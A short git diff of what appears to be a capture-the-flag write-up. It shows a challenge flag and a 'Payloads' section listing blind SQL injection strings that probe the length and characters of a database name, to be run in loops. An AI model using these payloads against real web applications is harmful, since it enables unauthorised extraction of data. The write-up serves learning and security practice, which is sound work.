@@ -219,7 +219,7 @@ Flag is <code>bucket{j01n5_m4k3_n0_53n53_a5ed15}</code>.
 
 ## Payloads
 
-These payloads should be used in loops with different values (as shown in the codes above).
+Here is a summary of all the payloads used in the various phases of the attack. These should be used in loops with different values (as shown in the codes above).
 
 + <code>' OR (SELECT LENGTH(database()))=numeric_value#</code> for the length of the database name;<br>
 + <code>' OR (SELECT SUBSTRING(database(),1,numeric_value))='substring'#</code> for database name;<br>
